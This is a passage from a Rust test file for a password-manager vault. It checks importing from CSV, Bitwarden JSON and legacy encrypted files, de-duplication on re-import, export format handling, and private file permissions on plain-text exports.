    csv_bytes.extend_from_slice(b",,login,,,,0,,,,\r\n");
    fs::write(&csv_path, &csv_bytes).unwrap();
    let report = import_into(&mut vault, "csv", &csv_path, None).unwrap();
    assert_eq!(report.imported, 1);
    assert_eq!(report.skipped, 1);
    assert_eq!(report.warnings.len(), 1);
    assert_eq!(vault.folders().len(), 1, "merged into existing folder");
    let imported = vault
        .items()
        .iter()
        .find(|i| i.name == "München")
        .expect("imported item");
    assert_eq!(imported.folder_id.as_deref(), Some(existing.id.as_str()));
    assert_eq!(imported.id.len(), 36);

    let bw_path = dir.path().join("bw.json");
    fs::write(&bw_path, serde_json::to_vec(&bitwarden_sample()).unwrap()).unwrap();
    let report = import_into(&mut vault, "bitwarden_json", &bw_path, None).unwrap();
    assert_eq!(report.imported, 5);
    assert_eq!(report.skipped, 3);
    assert!(vault.folders().iter().any(|f| f.name == "Banking"));
    let bank = vault.items().iter().find(|i| i.name == "Bank").unwrap();
    let banking = vault
        .folders()
        .iter()
        .find(|f| f.name == "Banking")
        .unwrap();
    assert_eq!(bank.folder_id.as_deref(), Some(banking.id.as_str()));

    let report = import_into(
        &mut vault,
        "legacy",
        &fixture("legacy_v2.json"),
        Some("Korrekt-Pferd-42!"),
    )
    .unwrap();
    assert_eq!(report.imported, 3);
    assert_eq!(report.warnings.len(), 1);
    assert!(matches!(
        import_into(&mut vault, "legacy", &fixture("legacy_v2.json"), None),
        Err(Error::InvalidInput(_))
    ));
    assert!(matches!(
        import_into(&mut vault, "pdf", &csv_path, None),
        Err(Error::InvalidInput(_))
    ));
    assert!(matches!(
        import_into(&mut vault, "csv", &dir.path().join("missing.csv"), None),
        Err(Error::NotFound(_))
    ));

    // Export the result in every format and read the encrypted one back.
    let total = vault.items().len();
    let data = vault.data().clone();
    let out = dir.path().join("out");
    export_to_file(&data, "csv", &out.join("x.csv"), None).unwrap();
    export_to_file(&data, "bitwarden_json", &out.join("x.json"), None).unwrap();
    assert!(matches!(
        export_to_file(&data, "keystead", &out.join("x.keystead"), None),
        Err(Error::InvalidInput(_))
    ));
    assert!(matches!(
        export_to_file(&data, "xml", &out.join("x.xml"), None),
        Err(Error::InvalidInput(_))
    ));
    let json_text = fs::read_to_string(out.join("x.json")).unwrap();
    assert_eq!(import_bitwarden_json(&json_text).unwrap().0.len(), total);
    // Importing the vault's own export again adds nothing: every item is a
    // duplicate, and nothing is written.
    let revision = vault.revision();
    let report = import_into(&mut vault, "bitwarden_json", &out.join("x.json"), None).unwrap();
    assert_eq!(report.imported, 0);
    assert_eq!(report.duplicates.len(), total, "{:?}", report.duplicates);
    assert!(report.conflicts_skipped.is_empty());
    assert_eq!(vault.items().len(), total);
    assert_eq!(vault.revision(), revision);
    let report = import_into(&mut vault, "csv", &out.join("x.csv"), None).unwrap();
    assert_eq!(report.imported, 0, "{:?}", report);
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(out.join("x.csv"))
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o077, 0, "plain-text exports are private");
    }
}

/// Encrypted export with the real (default) KDF parameters.
#[test]
fn encrypted_export_default_params() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("e.keystead");
    let data = sample_data();
    export_to_file(&data, "keystead", &path, Some("pw")).unwrap();
    let store = VaultStore::new(dir.path().join("data"));
    let mut vault = store
        .create_vault_with_params("Ziel", "pw", KdfParams::insecure_for_tests())
        .unwrap();
    let report = import_into(&mut vault, "keystead", &path, Some("pw")).unwrap();
    assert_eq!(report.imported, 4);
}
